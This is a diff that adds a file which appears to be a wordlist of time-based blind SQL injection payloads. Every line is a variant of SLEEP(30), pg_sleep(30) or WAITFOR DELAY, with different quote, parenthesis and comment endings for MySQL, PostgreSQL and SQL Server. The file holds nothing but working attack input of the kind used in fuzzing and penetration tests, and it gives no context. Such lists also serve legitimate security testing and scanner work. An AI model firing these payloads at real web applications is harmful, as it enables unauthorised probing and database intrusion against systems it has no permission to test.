@@ -1,0 +1,76 @@
+0'XOR(if(now()=sysdate()%2Csleep(30)%2C0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(30),0))XOR'Z
+1+++((SELECT+1+FROM+(SELECT+SLEEP(30))A))/*'XOR(((SELECT+1+FROM+(SELECT+SLEEP(30))A)))OR'|"XOR(((SELECT+1+FROM+(SELECT+SLEEP(30))A)))OR"*/+/*+60c97910-84e4-41d1-a2ef-cadb84887e89+*/
+(select(0)from(select(sleep(30)))v)/*'+(select(0)from(select(sleep(30)))v)+'"+(select(0)from(select(sleep(30)))v)+"*/
+1;SELECT IF((8303>8302),SLEEP(30),2356)#
+sleep(30)#
+(select * from (select(sleep(30)))a)
+1 or sleep(30)#	
+" or sleep(30)#
+' or sleep(30)#
+" or sleep(30)="
+' or sleep(30)='
+1) or sleep(30)#
+") or sleep(30)="
+') or sleep(30)='
+1)) or sleep(30)#
+")) or sleep(30)="
+')) or sleep(30)='
+;waitfor delay '0:0:30'--
+);waitfor delay '0:0:30'--
+';waitfor delay '0:0:30'--
+";waitfor delay '0:0:30'--
+');waitfor delay '0:0:30'--
+");waitfor delay '0:0:30'--
+));waitfor delay '0:0:30'--
+'));waitfor delay '0:0:30'--
+"));waitfor delay '0:0:30'--
+pg_sleep(30)--
+1 or pg_sleep(30)--
+" or pg_sleep(30)--
+' or pg_sleep(30)--
+1) or pg_sleep(30)--
+") or pg_sleep(30)--
+') or pg_sleep(30)--
+1)) or pg_sleep(30)--
+")) or pg_sleep(30)--
+')) or pg_sleep(30)--
+AND (SELECT * FROM (SELECT(SLEEP(30)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(30)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(30)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(30)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(30)))nQIP)#
+SLEEP(30)#
+SLEEP(30)--
+SLEEP(30)="
+SLEEP(30)='
+or SLEEP(30)
+or SLEEP(30)#
+or SLEEP(30)--
+or SLEEP(30)="
+or SLEEP(30)='
+waitfor delay '00:00:30'
+waitfor delay '00:00:30'--
+waitfor delay '00:00:30'#
+pg_SLEEP(30)
+pg_SLEEP(30)--
+pg_SLEEP(30)#
+or pg_SLEEP(30)
+or pg_SLEEP(30)--
+or pg_SLEEP(30)#
+AnD SLEEP(30)
+AnD SLEEP(30)--
+AnD SLEEP(30)#
+&&SLEEP(30)
+&&SLEEP(30)--
+&&SLEEP(30)#
+' AnD SLEEP(30) ANd '1
+'&&SLEEP(30)&&'1
+ORDER BY SLEEP(30)
+ORDER BY SLEEP(30)--
+ORDER BY SLEEP(30)#
+(SELECT * FROM (SELECT(SLEEP(30)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(30)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(30)))ecMj)--
++ SLEEP(30) + '
+SLEEP(30)/*' or SLEEP(30) or '" or SLEEP(30) or "*/
